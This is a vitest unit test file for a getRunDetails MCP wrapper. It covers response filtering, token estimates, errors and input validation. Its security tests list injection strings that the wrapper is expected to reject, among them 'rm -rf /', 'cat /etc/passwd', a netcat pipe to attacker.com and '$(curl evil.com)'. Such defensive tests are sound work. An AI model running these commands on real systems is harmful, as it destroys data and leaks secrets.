/**
 * Unit Tests for getRunDetails Wrapper
 *
 * Tests wrapper logic in isolation using mocked MCP client.
 * Validates filtering, token reduction, schema validation, and error handling.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import {
  createMCPMock,
  testSecurityScenarios,
  getAllSecurityScenarios,
  MCPErrors,
} from '@claude/testing';

// Mock the MCP client module BEFORE importing
// This prevents vitest from loading the real module
vi.mock('../config/lib/mcp-client', () => ({
  callMCPTool: vi.fn(),
}));

// Import the wrapper to test
import { getRunDetails } from './get-run-details';

// Import MCP client for type access
import * as mcpClient from '../config/lib/mcp-client';

describe('getRunDetails - Unit Tests', () => {
  let mcpMock: ReturnType<typeof createMCPMock>;

  beforeEach(() => {
    // Create fresh mock for each test
    mcpMock = createMCPMock();
    vi.mocked(mcpClient.callMCPTool).mockImplementation(mcpMock);
  });

  afterEach(() => {
    // Clear mocks after each test
    vi.clearAllMocks();
  });

  // ==========================================================================
  // Category 1: Wrapper Logic Tests (Mocked)
  // ==========================================================================

  describe('Filtering logic', () => {
    it('should filter response correctly', async () => {
      // Arrange: Mock MCP response - Currents returns run with metadata
      const mockRawData = {
        id: 'run-123',
        status: 'completed',
        createdAt: '2024-01-01T00:00:00Z',
        specs: 25,
        tests: 150,
        passed: 145,
        failed: 3,
        skipped: 2,
        pending: 0,
        duration: 120000,
        // Additional fields that should be filtered out
        configuration: { browser: 'chrome' },
        metadata: { commit: 'abc123' },
      };

      mcpMock.mockResolvedValue(mockRawData);

      // Act: Execute wrapper
      const result = await getRunDetails.execute({ runId: 'run-123' });

      // Assert: Verify response filtered to essentials only
      expect(result).toBeDefined();
      expect(result.run).toEqual({
        id: 'run-123',
        status: 'completed',
        createdAt: '2024-01-01T00:00:00Z',
        specs: 25,
        tests: 150,
        passed: 145,
        failed: 3,
        skipped: 2,
        pending: 0,
        duration: 120000,
      });
      expect(result.estimatedTokens).toBeGreaterThan(0);

      // Verify filtered fields are not present
      expect(result.run).not.toHaveProperty('configuration');
      expect(result.run).not.toHaveProperty('metadata');

      // Verify MCP client called correctly
      expect(mcpMock).toHaveBeenCalledTimes(1);
      expect(mcpMock).toHaveBeenCalledWith('currents', 'currents-get-run-details', {
        runId: 'run-123',
      });
    });

    it('should handle missing optional fields with defaults', async () => {
      // Arrange: Mock minimal response
      mcpMock.mockResolvedValue({});

      // Act
      const result = await getRunDetails.execute({ runId: 'run-456' });

      // Assert: Should use defaults for missing fields
      expect(result.run.id).toBe('run-456'); // Fallback to input runId
      expect(result.run.status).toBe('unknown'); // Default status
      expect(result.run.createdAt).toMatch(/^\d{4}-\d{2}-\d{2}T/); // ISO timestamp
      expect(result.run.specs).toBe(0);
      expect(result.run.tests).toBe(0);
      expect(result.run.passed).toBe(0);
      expect(result.run.failed).toBe(0);
      expect(result.run.skipped).toBe(0);
      expect(result.run.pending).toBe(0);
      expect(result.run.duration).toBeUndefined(); // Optional field
    });

    it('should handle partial data with some defaults', async () => {
      // Arrange: Mock response with some fields
      mcpMock.mockResolvedValue({
        id: 'run-789',
        status: 'running',
        tests: 50,
        passed: 30,
      });

      // Act
      const result = await getRunDetails.execute({ runId: 'run-789' });

      // Assert: Mix of actual and default values
      expect(result.run.id).toBe('run-789');
      expect(result.run.status).toBe('running');
      expect(result.run.tests).toBe(50);
      expect(result.run.passed).toBe(30);
      expect(result.run.failed).toBe(0); // Default
      expect(result.run.skipped).toBe(0); // Default
      expect(result.run.specs).toBe(0); // Default
    });

    it('should handle duration as optional', async () => {
      // Arrange: Mock response without duration (still running)
      mcpMock.mockResolvedValue({
        id: 'run-running',
        status: 'running',
        tests: 10,
      });

      // Act
      const result = await getRunDetails.execute({ runId: 'run-running' });

      // Assert: Duration should be undefined
      expect(result.run.duration).toBeUndefined();
    });
  });

  describe('Token estimation', () => {
    it('should calculate token estimate correctly', async () => {
      // Arrange: Mock response with run data
      const mockRun = {
        id: 'run-123',
        status: 'completed',
        createdAt: '2024-01-01T00:00:00Z',
        specs: 10,
        tests: 50,
        passed: 48,
        failed: 2,
        skipped: 0,
        pending: 0,
        duration: 60000,
      };

      mcpMock.mockResolvedValue(mockRun);

      // Act
      const result = await getRunDetails.execute({ runId: 'run-123' });

      // Assert: Token estimate should be based on filtered JSON size
      const expectedSize = JSON.stringify(result.run).length;
      const expectedTokens = Math.ceil(expectedSize / 4);

      expect(result.estimatedTokens).toBe(expectedTokens);
      expect(result.estimatedTokens).toBeGreaterThan(0);

      console.log(`Estimated tokens: ${result.estimatedTokens}`);
    });

    it('should calculate tokens for minimal data', async () => {
      // Arrange: Mock minimal response (defaults only)
      mcpMock.mockResolvedValue({});

      // Act
      const result = await getRunDetails.execute({ runId: 'run-min' });

      // Assert: Small token count
      expect(result.estimatedTokens).toBeGreaterThan(0);
      expect(result.estimatedTokens).toBeLessThan(50);
    });
  });

  describe('Response format handling', () => {
    it('should handle object format', async () => {
      // Arrange: MCP returns object format (standard format)
      mcpMock.mockResolvedValue({
        id: 'run-full',
        status: 'completed',
        createdAt: '2024-01-01T00:00:00Z',
        specs: 25,
        tests: 150,
        passed: 145,
        failed: 3,
        skipped: 2,
        pending: 0,
        duration: 120000,
      });

      // Act
      const result = await getRunDetails.execute({ runId: 'run-full' });

      // Assert: All fields should be present
      expect(result.run.id).toBe('run-full');
      expect(result.run.status).toBe('completed');
      expect(result.run.duration).toBe(120000);
    });

    it('should handle direct array format', async () => {
      // Arrange: MCP returns direct array format (edge case - not expected but should handle)
      const mockArray = [
        { id: 'run-1', status: 'completed', tests: 50 },
        { id: 'run-2', status: 'running', tests: 30 },
      ];
      mcpMock.mockResolvedValue(mockArray as any);

      // Act
      const result = await getRunDetails.execute({ runId: 'run-test' });

      // Assert: Should handle gracefully with defaults
      expect(result.run).toBeDefined();
      expect(result.run.id).toBe('run-test'); // Fallback to input
    });

    it('should handle tuple format', async () => {
      // Arrange: MCP returns tuple format (edge case)
      const mockTuple = [{ id: 'run-tuple', status: 'completed' }];
      mcpMock.mockResolvedValue(mockTuple as any);

      // Act
      const result = await getRunDetails.execute({ runId: 'run-tuple' });

      // Assert: Should handle tuple without crashing
      expect(result.run).toBeDefined();
      expect(result.run.id).toBe('run-tuple'); // Fallback to input
    });

    it('should handle different status values', async () => {
      // Test various status values
      const statuses = ['running', 'completed', 'failed', 'cancelled', 'timeout'];

      for (const status of statuses) {
        mcpMock.mockResolvedValue({ id: 'run-test', status });

        const result = await getRunDetails.execute({ runId: 'run-test' });

        expect(result.run.status).toBe(status);
      }
    });
  });

  // ==========================================================================
  // Category 2: Error Handling Tests
  // ==========================================================================

  describe('MCP server errors', () => {
    it('should handle rate limit errors', async () => {
      // Arrange
      mcpMock.mockRejectedValue(MCPErrors.rateLimit());

      // Act & Assert
      await expect(getRunDetails.execute({ runId: 'run-123' })).rejects.toThrow(/rate limit/i);
    });

    it('should handle server errors', async () => {
      // Arrange
      mcpMock.mockRejectedValue(MCPErrors.serverError());

      // Act & Assert
      await expect(getRunDetails.execute({ runId: 'run-123' })).rejects.toThrow(/server.*error/i);
    });

    it('should handle network timeout', async () => {
      // Arrange
      mcpMock.mockRejectedValue(MCPErrors.timeout());

      // Act & Assert
      await expect(getRunDetails.execute({ runId: 'run-123' })).rejects.toThrow(/ETIMEDOUT/);
    });

    it('should handle authentication errors', async () => {
      // Arrange
      mcpMock.mockRejectedValue(MCPErrors.unauthorized());

      // Act & Assert
      await expect(getRunDetails.execute({ runId: 'run-123' })).rejects.toThrow(
        /authentication required/i
      );
    });

    it('should handle not found errors', async () => {
      // Arrange
      mcpMock.mockRejectedValue(new Error('Run not found'));

      // Act & Assert
      await expect(getRunDetails.execute({ runId: 'invalid-run' })).rejects.toThrow(
        /run not found/i
      );
    });
  });

  describe('Malformed responses', () => {
    it('should handle null response', async () => {
      // Arrange
      mcpMock.mockResolvedValue(null);

      // Act
      const result = await getRunDetails.execute({ runId: 'run-null' });

      // Assert: Should use all defaults
      expect(result.run.id).toBe('run-null');
      expect(result.run.status).toBe('unknown');
      expect(result.run.tests).toBe(0);
    });

    it('should handle undefined fields', async () => {
      // Arrange
      mcpMock.mockResolvedValue({
        id: undefined,
        status: undefined,
        tests: undefined,
      });

      // Act
      const result = await getRunDetails.execute({ runId: 'run-undef' });

      // Assert: Should use defaults for undefined values
      expect(result.run.id).toBe('run-undef');
      expect(result.run.status).toBe('unknown');
      expect(result.run.tests).toBe(0);
    });

    it('should handle string numbers', async () => {
      // Arrange: Some APIs return numbers as strings
      mcpMock.mockResolvedValue({
        id: 'run-123',
        tests: '50' as any,
        passed: '45' as any,
      });

      // Act
      const result = await getRunDetails.execute({ runId: 'run-123' });

      // Assert: Should coerce to numbers
      expect(typeof result.run.tests).toBe('number');
      expect(typeof result.run.passed).toBe('number');
    });
  });

  // ==========================================================================
  // Category 3: Input Validation Tests
  // ==========================================================================

  describe('Input validation', () => {
    it('should accept valid runId', async () => {
      // Arrange
      mcpMock.mockResolvedValue({});

      // Act & Assert: Various valid runId formats
      await expect(getRunDetails.execute({ runId: 'run-123' })).resolves.toBeDefined();
      await expect(getRunDetails.execute({ runId: 'abc123' })).resolves.toBeDefined();
      await expect(getRunDetails.execute({ runId: 'RUN_456' })).resolves.toBeDefined();
      await expect(
        getRunDetails.execute({ runId: '550e8400-e29b-41d4-a716-446655440000' })
      ).resolves.toBeDefined();
    });

    it('should reject empty runId', async () => {
      // Act & Assert
      await expect(getRunDetails.execute({ runId: '' })).rejects.toThrow();
    });

    it('should reject missing runId', async () => {
      // Act & Assert
      await expect(getRunDetails.execute({} as any)).rejects.toThrow();
      await expect(getRunDetails.execute({ runId: undefined as any })).rejects.toThrow();
      await expect(getRunDetails.execute({ runId: null as any })).rejects.toThrow();
    });

    it('should reject invalid input types', async () => {
      // Act & Assert: Various invalid inputs
      await expect(getRunDetails.execute(null as any)).rejects.toThrow();
      await expect(getRunDetails.execute(undefined as any)).rejects.toThrow();
      await expect(getRunDetails.execute('invalid' as any)).rejects.toThrow();
      await expect(getRunDetails.execute(123 as any)).rejects.toThrow();
    });

    it('should reject non-string runId', async () => {
      // Act & Assert
      await expect(getRunDetails.execute({ runId: 123 as any })).rejects.toThrow();
      await expect(getRunDetails.execute({ runId: true as any })).rejects.toThrow();
      await expect(getRunDetails.execute({ runId: {} as any })).rejects.toThrow();
    });
  });

  // ==========================================================================
  // Category 4: Security Tests (Automated)
  // ==========================================================================

  describe('Security', () => {
    it('should reject path traversal in runId', async () => {
      // Arrange: Path traversal attack vectors
      const pathTraversalAttacks = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32',
        'run-123/../admin',
        'run-123/../../config',
      ];

      // Act & Assert: All should be rejected
      for (const attack of pathTraversalAttacks) {
        await expect(getRunDetails.execute({ runId: attack })).rejects.toThrow(
          /path traversal/i
        );
      }
    });

    it('should reject command injection in runId', async () => {
      // Arrange: Command injection attack vectors
      const commandInjectionAttacks = [
        'run-123; rm -rf /',
        'run-123 && cat /etc/passwd',
        'run-123 | nc attacker.com 1234',
        'run-123 `whoami`',
        'run-123 $(curl evil.com)',
      ];

      // Act & Assert: All should be rejected
      for (const attack of commandInjectionAttacks) {
        await expect(getRunDetails.execute({ runId: attack })).rejects.toThrow(
          /command injection/i
        );
      }
    });

    it('should reject control characters in runId', async () => {
      // Arrange: Control character attack vectors
      const controlCharAttacks = [
        'run-123\x00', // Null byte
        'run-123\r\n', // CRLF injection
        'run-123\x1b[31m', // ANSI escape codes
      ];

      // Act & Assert: All should be rejected
      for (const attack of controlCharAttacks) {
        await expect(getRunDetails.execute({ runId: attack })).rejects.toThrow(
          /control characters/i
        );
      }
    });

    it('should accept safe special characters', async () => {
      // Arrange
      mcpMock.mockResolvedValue({});

      // Act & Assert: Safe special characters should be allowed
      await expect(getRunDetails.execute({ runId: 'run-123' })).resolves.toBeDefined();
      await expect(getRunDetails.execute({ runId: 'run_456' })).resolves.toBeDefined();
      await expect(getRunDetails.execute({ runId: 'run.789' })).resolves.toBeDefined();
      await expect(
        getRunDetails.execute({ runId: 'run-abc-123-def-456' })
      ).resolves.toBeDefined();
    });
  });

  // ==========================================================================
  // Category 5: Performance Tests
  // ==========================================================================

  describe('Performance', () => {
    it('should have minimal wrapper overhead', async () => {
      // Arrange
      mcpMock.mockResolvedValue({
        id: 'run-123',
        status: 'completed',
        tests: 50,
      });

      // Act: Measure execution time
      const start = Date.now();
      const iterations = 100;

      for (let i = 0; i < iterations; i++) {
        await getRunDetails.execute({ runId: 'run-123' });
      }

      const avgTime = (Date.now() - start) / iterations;

      // Assert: Average time should be very fast (mocked)
      expect(avgTime).toBeLessThan(10); // <10ms per call
      console.log(`Average execution time: ${avgTime.toFixed(2)}ms per call`);
    });

    it('should handle filtering efficiently', async () => {
      // Arrange: Mock response with lots of extra metadata
      const mockRawData = {
        id: 'run-123',
        status: 'completed',
        createdAt: '2024-01-01T00:00:00Z',
        specs: 100,
        tests: 1000,
        passed: 950,
        failed: 30,
        skipped: 15,
        pending: 5,
        duration: 600000,
        // Lots of extra fields to filter
        configuration: { browser: 'chrome', viewport: { width: 1920, height: 1080 } },
        metadata: { commit: 'abc123', branch: 'main', author: 'test@example.com' },
        results: Array(1000).fill({ spec: 'test.cy.js', status: 'passed' }),
      };

      mcpMock.mockResolvedValue(mockRawData);

      // Act: Measure filtering time
      const start = Date.now();
      const result = await getRunDetails.execute({ runId: 'run-123' });
      const filterTime = Date.now() - start;

      // Assert: Filtering should be fast
      expect(result.run).toBeDefined();
      expect(filterTime).toBeLessThan(20); // <20ms for filtering
      console.log(`Filter time: ${filterTime}ms`);
    });
  });
});
